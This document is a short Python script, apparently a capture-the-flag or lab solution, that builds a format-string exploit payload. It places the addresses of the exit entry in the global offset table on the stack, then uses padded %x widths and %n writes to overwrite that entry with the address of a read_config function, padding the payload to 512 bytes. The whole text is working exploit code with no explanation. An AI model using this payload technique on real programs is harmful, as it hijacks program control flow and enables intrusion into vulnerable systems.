import struct

read_config = 0x80485cb 
exit_plt = 0x804a024

def pad(s):
        return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", exit_plt)
exploit += struct.pack("I", exit_plt+2)
exploit += "AAAABBBBCCCCDDDDEEEEFFFF"
exploit += "%7$34218x "
exploit += "%7$n"
exploit += "%8$33337x"
exploit += "%8$n"

print(pad(exploit))